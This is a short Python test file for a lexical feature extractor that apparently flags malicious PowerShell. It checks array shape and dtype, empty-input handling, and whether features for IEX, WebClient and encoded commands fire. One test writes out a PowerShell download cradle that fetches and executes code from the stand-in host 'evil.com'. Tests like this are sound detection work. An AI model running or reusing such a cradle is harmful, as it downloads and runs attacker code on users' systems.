import numpy as np
from hierdetect.extractors.lexical import LexicalFeatureExtractor

def test_feature_extraction_shape():
    """Ensure the extractor always returns a 20-dimensional numpy array."""
    script = "Write-Host 'This is a test script'"
    features = LexicalFeatureExtractor.extract(script)
    
    assert isinstance(features, np.ndarray)
    assert features.shape == (20,)
    assert features.dtype == np.float32

def test_specific_features():
    """Test specific hand-crafted logic like Base64 and IEX detection."""
    malicious_script = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com') -enc JABiACAAPQAgAA=="
    features = LexicalFeatureExtractor.extract(malicious_script)
    
    # Feature 11: has_iex
    assert features[11] == 1.0
    # Feature 12: has_webclient
    assert features[12] == 1.0
    # Feature 13: has_enc
    assert features[13] == 1.0

def test_empty_script_handling():
    """Ensure the extractor doesn't crash on empty input."""
    features = LexicalFeatureExtractor.extract("")
    assert not np.isnan(features).any()